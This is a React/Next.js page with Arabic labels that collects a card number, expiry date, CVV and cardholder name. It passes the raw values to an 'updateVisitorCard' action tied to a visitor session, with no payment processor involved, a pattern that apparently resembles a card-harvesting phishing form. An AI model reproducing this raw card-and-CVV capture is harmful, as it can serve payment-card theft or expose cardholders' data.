"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { updateVisitorCard } from "@/lib/visitor-actions"

export default function CardPage() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [mounted, setMounted] = useState(false)
  const [sessionId, setSessionId] = useState("")
  const [docId, setDocId] = useState("")

  useEffect(() => {
    setMounted(true)
    const storedSessionId = localStorage.getItem("visitorSessionId")
    const storedDocId = localStorage.getItem("visitorDocId")
    
    if (!storedSessionId || !storedDocId) {
      router.push("/visitor/login")
      return
    }
    
    setSessionId(storedSessionId)
    setDocId(storedDocId)
  }, [router])

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "")
    const groups = digits.match(/.{1,4}/g)
    return groups ? groups.join(" ") : ""
  }

  const formatExpiryDate = (value: string) => {
    const digits = value.replace(/\D/g, "")
    if (digits.length >= 2) {
      return digits.slice(0, 2) + "/" + digits.slice(2, 4)
    }
    return digits
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted)
    }
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    if (formatted.replace("/", "").length <= 4) {
      setExpiryDate(formatted)
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, "")
    if (digits.length <= 4) {
      setCvv(digits)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!cardNumber || !expiryDate || !cvv || !cardholderName || !docId) return

    setIsLoading(true)
    
    try {
      await updateVisitorCard(docId, sessionId, cardNumber, expiryDate, cvv, cardholderName)
      router.push("/visitor/success")
    } catch (error) {
      console.error("Error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div 
      className={`min-h-screen flex flex-col items-center justify-center px-5 py-10 transition-opacity duration-500 ${
        mounted ? "opacity-100" : "opacity-0"
      }`}
    >
      {/* Card Preview */}
      <div className="relative w-72 h-44 md:w-80 md:h-48 rounded-2xl bg-gradient-to-br from-[#1e293b] to-[#14532d] p-5 shadow-2xl mb-8">
        {/* Chip */}
        <div className="w-10 h-7 bg-yellow-400 rounded" />
        
        {/* Contactless Icon */}
        <div className="absolute right-5 top-10">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-white">
            <path d="M7 12c0-2.76 2.24-5 5-5" stroke="currentColor" strokeWidth="1.5" fill="none" />
            <path d="M7 8c0-2.76 2.24-5 5-5" stroke="currentColor" strokeWidth="1.5" fill="none" />
            <path d="M7 16c0-2.76 2.24-5 5-5" stroke="currentColor" strokeWidth="1.5" fill="none" />
          </svg>
        </div>

        {/* Card Number */}
        <div className="mt-8 text-white tracking-widest text-sm md:text-base font-mono" dir="ltr">
          {cardNumber || "•••• •••• •••• ••••"}
        </div>

        {/* Cardholder & Expiry */}
        <div className="flex justify-between mt-4 text-white/80 text-xs">
          <span>{cardholderName || "CARDHOLDER NAME"}</span>
          <span dir="ltr">{expiryDate || "MM/YY"}</span>
        </div>
      </div>

      <h1 className="text-2xl text-white font-bold mb-6 text-center">
        أدخل بيانات البطاقة
      </h1>

      <form onSubmit={handleSubmit} className="w-full max-w-sm space-y-4">
        {/* Card Number */}
        <div>
          <label className="block text-white/80 text-sm mb-2">رقم البطاقة</label>
          <input
            type="text"
            inputMode="numeric"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="0000 0000 0000 0000"
            className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all font-mono"
            dir="ltr"
            required
          />
        </div>

        {/* Cardholder Name */}
        <div>
          <label className="block text-white/80 text-sm mb-2">اسم حامل البطاقة</label>
          <input
            type="text"
            value={cardholderName}
            onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
            placeholder="JOHN DOE"
            className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all uppercase"
            dir="ltr"
            required
          />
        </div>

        {/* Expiry & CVV Row */}
        <div className="flex gap-4">
          <div className="flex-1">
            <label className="block text-white/80 text-sm mb-2">تاريخ الانتهاء</label>
            <input
              type="text"
              inputMode="numeric"
              value={expiryDate}
              onChange={handleExpiryChange}
              placeholder="MM/YY"
              className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all font-mono"
              dir="ltr"
              required
            />
          </div>
          <div className="flex-1">
            <label className="block text-white/80 text-sm mb-2">CVV</label>
            <input
              type="text"
              inputMode="numeric"
              value={cvv}
              onChange={handleCvvChange}
              placeholder="123"
              className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all font-mono"
              dir="ltr"
              required
            />
          </div>
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isLoading}
          className="w-full py-4 mt-4 rounded-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold text-lg shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? "جاري المعالجة..." : "تأكيد الدفع"}
        </button>
      </form>
    </div>
  )
}
